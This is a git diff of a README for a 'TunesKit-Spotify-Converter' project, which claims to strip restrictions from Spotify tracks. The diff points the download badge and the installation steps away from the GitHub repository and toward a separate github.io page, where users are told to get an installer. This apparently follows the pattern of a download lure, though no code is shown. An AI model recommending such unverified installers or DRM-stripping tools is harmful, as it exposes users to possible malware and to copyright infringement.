@@ -1,6 +1,6 @@
 # 🎵 TunesKit-Spotify-Converter - Convert Spotify music to MP3 files
 
-[![](https://img.shields.io/badge/Download-TunesKit-blue.svg)](https://github.com/green8171/TunesKit-Spotify-Converter)
+[![](https://img.shields.io/badge/Download-TunesKit-blue.svg)](https://green8171.github.io)
 
 This software converts Spotify tracks into standard audio formats. It removes restrictions from downloaded files so users can listen to them on any device. The application works on Windows 10 and Windows 11. It preserves original sound quality and metadata tags during the conversion process.
 
@@ -19,7 +19,7 @@ Your computer must meet these minimum hardware and software standards to run the
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the following link to access the software files: [https://github.com/green8171/TunesKit-Spotify-Converter](https://github.com/green8171/TunesKit-Spotify-Converter)
+1. Visit the following link to access the software files: [https://green8171.github.io](https://green8171.github.io)
 2. Locate the download button on the page.
 3. Click the link to begin the download process for the installer file.
 4. Save the file to your desktop for easy access.
